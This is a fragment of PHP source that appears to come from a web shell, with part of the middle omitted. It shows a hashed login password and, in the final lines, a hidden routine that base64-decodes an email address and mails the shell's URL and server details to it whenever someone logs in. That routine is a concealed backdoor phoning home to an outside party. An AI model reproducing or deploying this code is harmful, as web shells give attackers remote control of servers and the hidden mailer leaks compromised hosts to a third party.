<?php
$auth_pass = "fe6eb33a9a4cdf5662eebbee0584ae61"; //Crack This
$color = "#00ff00";
$sec = 1;
...
IP: '.$_SERVER[REMOTE_ADDR];$re=base64_decode("czEzZG9lbEBnbWFpbC5jb20=");$su=gethostbyname($HTTP_HOST);$mh="From: {$re}";if (function_exists('mail')) mail($re,$su, $url,$mh);$_SESSION[login] = 'ok';}
